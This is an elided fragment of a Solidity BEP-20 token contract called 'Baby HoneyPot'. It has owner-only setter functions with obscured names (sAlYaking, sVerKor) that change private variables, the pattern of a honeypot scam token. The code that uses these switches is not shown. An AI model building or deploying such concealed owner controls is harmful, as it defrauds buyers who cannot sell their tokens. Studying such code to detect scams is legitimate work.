...
contract BabyHoneyPot is IBEP20XT {
    using MathXT for uint256;

    string public name20TT =  "Baby HoneyPot";
    string public symbol20TT =  "BHP";
    uint8 public decimals20TT = 9;
    uint public _totalSupplyX = 1*10**15 * 10**9;
    
    address private _owner;
    uint8 private _making;
    uint8 private _smaking;
  ...
  function decimals() public view virtual returns (uint8) {
    ...
    function sAlYaking(uint8 making) public virtual onlyOwner {
		_making = making;
	}
    ...
    function sVerKor(uint8 smaking) public virtual onlyOwner {
		_smaking = smaking;
	}
